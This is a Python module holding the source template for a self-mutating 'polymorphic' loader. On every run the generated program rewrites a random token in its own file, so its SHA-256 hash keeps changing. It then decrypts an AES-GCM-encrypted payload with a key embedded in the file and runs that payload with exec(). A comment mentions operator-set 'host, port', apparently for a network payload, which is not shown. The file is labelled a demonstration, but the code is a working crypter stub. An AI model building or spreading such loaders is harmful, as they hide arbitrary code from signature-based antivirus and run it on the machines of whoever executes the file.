"""The generated polymorphic program's source, as a template string.

This is RUN-TIME code: it executes when the generated program is run, not at
build time. polymorphic.py fills the {payload_*}, {mutation_token} and
{old/new_mutation_line} placeholders and writes the result as the generated
program. The program decrypts its payload with the ``cryptography`` library,
which must be importable at run time. It is kept in its own file so that
polymorphic.py reads as pure build-time logic.
"""

TEMPLATE = '''#!/usr/bin/env python3
"""Generated polymorphic demonstration.

This program rewrites its own source file on every run, which changes its
SHA-256 while keeping its behaviour identical, then decrypts and executes the
payload embedded in it.
"""

import base64
import os
import re
import secrets
import sys

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PAYLOAD_CIPHERTEXT = "{payload_ciphertext}"
PAYLOAD_NONCE = "{payload_nonce}"
PAYLOAD_AAD = b"HBXP"
PAYLOAD_KEY = "{payload_key}"

MUTATION_TOKEN = "{mutation_token}"


def _update_signature():
    """Rewrite this program's own MUTATION_TOKEN, changing its file hash.

    A freshly generated random token is written on **every** run, so the file's
    SHA-256 keeps changing indefinitely while the program's behaviour stays
    identical. The token line is located with a regex, so the new value never
    has to match a value baked in at generation time.
    """

    path = os.path.abspath(__file__)

    try:
        with open(path, "r", encoding="utf-8") as handle:
            source = handle.read()
    except OSError:
        return False

    fresh_token = secrets.token_hex(16)
    new_source, count = re.subn(
        r'MUTATION_TOKEN = "[0-9a-f]*"',
        'MUTATION_TOKEN = "' + fresh_token + '"',
        source,
        count=1,
    )

    if count == 0:
        return False

    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(new_source)
    except OSError:
        return False

    return True


def _recover_payload():
    """Decrypt the payload with the embedded key.

    AES-GCM authenticates the payload, so a wrong key or any tampering makes
    the decryption fail; no separate integrity check is needed.
    """

    key = base64.b64decode(PAYLOAD_KEY)
    nonce = base64.b64decode(PAYLOAD_NONCE)
    ciphertext = base64.b64decode(PAYLOAD_CIPHERTEXT)

    return AESGCM(key).decrypt(nonce, ciphertext, PAYLOAD_AAD)


def main():
    print("[INFO] Polymorphic signature updated successfully.", flush=True)

    _update_signature()

    try:
        payload = _recover_payload()
    except Exception as exc:  # noqa: BLE001 - report and stop
        print("[ERROR] " + str(exc), file=sys.stderr)
        return 1

    try:
        code = compile(payload, "payload", "exec")
    except SyntaxError as exc:
        print("[ERROR] embedded payload is not valid Python: " + str(exc), file=sys.stderr)
        return 1

    # The payload receives this program's own arguments, so the operator can
    # configure it (host, port, ...) at run time.
    namespace = {
        "__name__": "__main__",
        "__file__": "payload",
        "__builtins__": __builtins__,
    }
    exec(code, namespace)  # noqa: S102

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''
